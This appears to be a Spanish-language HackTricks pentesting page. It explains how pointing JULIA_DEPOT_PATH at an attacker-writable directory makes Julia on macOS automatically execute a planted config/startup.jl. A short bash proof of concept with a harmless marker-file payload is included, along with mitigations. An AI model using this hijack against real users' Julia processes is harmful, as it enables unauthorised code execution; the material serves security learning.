# Inyección en aplicaciones Julia de macOS

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` y `startup.jl`

Julia normalmente ejecuta `config/startup.jl` desde su primer depot al iniciarse. `JULIA_DEPOT_PATH` controla la lista de depots, por lo que apuntarlo a un árbol legible por el atacante redirige el archivo de inicio cargado automáticamente.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
El separador final resulta útil cuando la víctima aún necesita sus paquetes normales. `julia --startup-file=no` deshabilita este archivo de inicio. Limpia la variable antes del lanzamiento porque también controla los registros de paquetes, los entornos, las cachés y las ubicaciones de carga de código.

## References

- [1] [Julia command-line interface: Archivo de inicio](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
